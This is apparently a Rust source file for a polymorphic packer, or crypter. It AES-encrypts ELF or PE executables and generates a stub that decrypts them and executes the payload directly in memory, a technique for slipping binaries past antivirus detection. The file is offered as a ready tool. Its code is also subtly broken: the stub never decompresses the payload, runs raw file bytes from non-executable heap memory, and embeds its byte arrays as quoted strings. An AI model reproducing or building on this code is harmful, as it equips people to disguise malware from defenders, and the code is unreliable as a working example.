use std::fs::{read, File};
use std::io::Write;
use std::process::Command;
use rand::{SeedableRng, rngs::StdRng, RngCore};
use aes::Aes256;
use aes::cipher::NewBlockCipher;
use block_modes::{Cbc, BlockMode};
use block_modes::block_padding::Pkcs7;
use flate2::{Compression, write::ZlibEncoder};
use goblin::Object;
use clap::{Parser, Args};

#[derive(Parser, Debug)]
#[clap(author = "Your Name", version = "1.0")]
struct CommandLineArguments {
    #[clap(short, long)]
    input_file: String,

    #[clap(short, long)]
    output_file: String,
}

fn generate_dynamic_key_iv() -> ([u8; 32], [u8; 16]) {
    let mut key = [0u8; 32];
    let mut iv = [0u8; 16];
    let mut rng = StdRng::from_entropy();
    rng.fill_bytes(&mut key);
    rng.fill_bytes(&mut iv);
    (key, iv)
}

fn encrypt_data(plaintext: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8> {
    let cipher = Aes256::new(key.into());
    let mode = Cbc::<Aes256, Pkcs7>::new(cipher, iv.into());
    mode.encrypt_vec(plaintext)
}

fn decrypt_data(ciphertext: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8> {
    let cipher = Aes256::new(key.into());
    let mode = Cbc::<Aes256, Pkcs7>::new(cipher, iv.into());
    mode.decrypt_vec(ciphertext).unwrap()
}

fn compress_data(data: &[u8]) -> Vec<u8> {
    let mut encoder = ZlibEncoder::new(Vec::new(), Compression::best());
    encoder.write_all(data).unwrap();
    encoder.finish().unwrap()
}

fn generate_polymorphic_stub(encrypted_payload: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> String {
    let stub_code = format!(
        r#"
use std::mem;
use std::ptr;

fn decrypt_data(ciphertext: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8> {{
    let cipher = aes::Aes256::new(key.into());
    let mode = block_modes::Cbc::<aes::Aes256, block_modes::block_padding::Pkcs7>::new(cipher, iv.into());
    mode.decrypt_vec(ciphertext).unwrap()
}}

fn main() {{
    let encrypted_payload = {:?};
    let key = {:?};
    let iv = {:?};

    let decrypted_payload = decrypt_data(&encrypted_payload, &key, &iv);

    let exec_mem = unsafe {{
        let layout = std::alloc::Layout::from_size_align(decrypted_payload.len(), 1).unwrap();
        let ptr = std::alloc::alloc(layout);
        ptr.copy_from_nonoverlapping(decrypted_payload.as_ptr(), decrypted_payload.len());
        ptr
    }};
    unsafe {{
        let func: fn() = std::mem::transmute(exec_mem);
        func();
    }}
}}
        "#,
        encrypted_payload.iter().map(|byte| format!("0x{:02x}", byte)).collect::<Vec<_>>().join(", "),
        key.iter().map(|byte| format!("0x{:02x}", byte)).collect::<Vec<_>>().join(", "),
        iv.iter().map(|byte| format!("0x{:02x}", byte)).collect::<Vec<_>>().join(", ")
    );

    stub_code
}

fn create_final_executable(encrypted_payload: Vec<u8>, key: [u8; 32], iv: [u8; 16], output_file: &str) {
    let polymorphic_stub = generate_polymorphic_stub(&encrypted_payload, &key, &iv);

    // Write the polymorphic stub to file
    let mut stub_file = File::create("polymorphic_stub.rs").unwrap();
    stub_file.write_all(polymorphic_stub.as_bytes()).unwrap();

    // Compile the stub into executable
    Command::new("rustc")
        .args(&["polymorphic_stub.rs", "-o", output_file])
        .output()
        .expect("Failed to compile polymorphic stub");
    
    println!("Polymorphic packed executable created: {}", output_file);
}

fn handle_executable_file(input_file: &str, output_file: &str) -> Result<(), Box<dyn std::error::Error>> {
    let bytes = read(input_file)?;
    match Object::parse(&bytes)? {
        Object::Elf(_) => {
            // Handle ELF file
            let compressed_payload = compress_data(&bytes);
            let (key, iv) = generate_dynamic_key_iv();
            let encrypted_payload = encrypt_data(&compressed_payload, &key, &iv);
            create_final_executable(encrypted_payload, key, iv, output_file);
        }
        Object::PE(_) => {
            // Handle PE file
            let compressed_payload = compress_data(&bytes);
            let (key, iv) = generate_dynamic_key_iv();
            let encrypted_payload = encrypt_data(&compressed_payload, &key, &iv);
            create_final_executable(encrypted_payload, key, iv, output_file);
        }
        _ => {
            return Err("Unsupported executable kind".into());
        }
    }
    Ok(())
}

fn main() {
    let args = CommandLineArguments::parse();

    match handle_executable_file(&args.input_file, &args.output_file) {
        Ok(_) => {
            println!("Polymorphic packing successful!");
        }
        Err(e) => {
            println!("Error: {}", e);
        }
    }
}
